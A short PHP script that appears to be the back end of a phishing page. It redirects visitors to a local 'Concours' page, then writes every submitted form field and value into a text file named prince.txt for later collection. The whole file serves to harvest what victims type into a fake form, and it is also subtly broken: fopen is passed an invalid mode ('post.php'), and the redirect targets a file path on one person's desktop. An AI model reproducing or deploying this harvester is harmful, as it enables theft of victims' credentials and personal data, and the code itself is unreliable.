<?php
header ('Location:file:///C:/Users/225TECHNOLOGIES/Desktop/Concours/Pages/index.html');
$handle = fopen("prince.txt", "post.php");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>